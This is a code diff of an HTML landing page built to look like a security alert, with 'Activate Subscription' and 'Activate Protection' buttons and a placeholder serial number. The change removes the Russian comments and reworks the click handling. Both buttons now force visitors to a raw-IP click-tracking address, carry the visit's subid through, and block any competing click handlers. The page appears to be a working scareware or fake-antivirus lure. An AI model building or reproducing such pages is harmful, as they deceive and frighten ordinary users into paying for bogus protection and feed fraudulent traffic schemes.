@@ -7,7 +7,6 @@
   <meta name="robots" content="noindex,nofollow" />
 
   <style>
-  /* База и лэйаут */
   html { box-sizing: border-box; }
   *, *::before, *::after { box-sizing: inherit; }
   body {
@@ -20,7 +19,6 @@
     min-height: 100vh;
   }
 
-  /* Карточка */
   .popup {
     background: #fff;
     border: 1px solid #ccc;
@@ -32,7 +30,6 @@
     padding: clamp(16px, 3.5vw, 24px);
   }
 
-  /* Красная шапка */
   .popup h2 {
     background: #b91c1c;
     color: #fff;
@@ -65,7 +62,6 @@
     word-break: break-word;
   }
 
-  /* Кнопки: красные + анимации */
   .btn, #activateBtn, #alertBtn {
     background: #b91c1c;
     color: #fff;
@@ -93,7 +89,6 @@
     .btn:hover, #activateBtn:hover, #alertBtn:hover { animation: none !important; box-shadow: none !important; }
   }
 
-  /* Размеры кнопок */
   @media (max-width: 768px) {
     .btn, #activateBtn, #alertBtn {
       display: block;
@@ -112,7 +107,6 @@
     }
   }
 
-  /* Нижний алерт */
   .footer-alert {
     position: fixed;
     bottom: -220px;
@@ -158,28 +152,36 @@
   }
   </style>
 
-  <!-- Скрипт только для появления нижнего алерта и фикса кликов -->
   <script>
   document.addEventListener('DOMContentLoaded', function () {
-    // Показать нижний алерт через 1.2с
+    // Показать нижний алерт через 1.2с (как было)
     setTimeout(() => {
       const box = document.getElementById('alertBox');
       if (box) box.classList.add('show');
     }, 1200);
 
-    // Жёсткая привязка кликов на случай чужих обработчиков
-    const CLICK_URL = 'http://159.223.234.92/click/hWF1Y3';
-    ['activateBtn','alertBtn'].forEach(id => {
+    // --- ВАЖНО: формируем правильный Click URL с привязкой к визиту ---
+    const params = new URLSearchParams(location.search);
+    const subid = params.get('_subid') || params.get('subid') || '';
+    const CLICK_BASE = 'http://159.223.234.92/click/hWF1Y3';
+    // Пытаемся сразу передать и subid, и _subid (на разных инсталляциях по-разному)
+    const clickUrl = subid
+      ? `${CLICK_BASE}?subid=${encodeURIComponent(subid)}&_subid=${encodeURIComponent(subid)}`
+      : CLICK_BASE;
+
+    // Прописываем ссылку и страхуемся от перехватов
+    function wire(id){
       const el = document.getElementById(id);
-      if (!el) return;
-      el.setAttribute('href', CLICK_URL);
-      el.setAttribute('rel', 'nofollow noopener');
-      el.addEventListener('click', function (e) {
-        try { e.stopImmediatePropagation(); } catch(_) {}
-        try { e.preventDefault(); } catch(_) {}
-        window.location.assign(CLICK_URL);
-      }, true); // capture = true, чтобы обойти другие слушатели
-    });
+      if(!el) return;
+      el.setAttribute('href', clickUrl);
+      el.addEventListener('click', function(e){
+        try{ e.stopImmediatePropagation(); }catch(_){}
+        try{ e.preventDefault(); }catch(_){}
+        window.location.assign(clickUrl);
+      }, true);
+    }
+    wire('activateBtn');
+    wire('alertBtn');
   });
   </script>
 </head>
@@ -192,9 +194,7 @@
     <div class="serial">XXXX - XXXX - XXXX - XXXX</div>
 
     <!-- Главная кнопка -->
-    <a id="activateBtn" class="btn"
-       href="http://159.223.234.92/click/hWF1Y3"
-       onclick="try{event.stopImmediatePropagation();event.preventDefault();}catch(e){};window.location.assign('http://159.223.234.92/click/hWF1Y3');return false;">
+    <a id="activateBtn" class="btn" href="#">
       Activate Subscription
     </a>
 
@@ -203,13 +203,11 @@
     </div>
   </div>
 
-  <!-- Нижняя плашка с той же ссылкой -->
+  <!-- Нижняя плашка -->
   <div class="footer-alert" id="alertBox">
     <h3>Security reminder</h3>
     <p>Regularly update your software and keep your device protected.</p>
-    <a id="alertBtn"
-       href="http://159.223.234.92/click/hWF1Y3"
-       onclick="try{event.stopImmediatePropagation();event.preventDefault();}catch(e){};window.location.assign('http://159.223.234.92/click/hWF1Y3');return false;">
+    <a id="alertBtn" href="#">
       Activate Protection
     </a>
   </div>
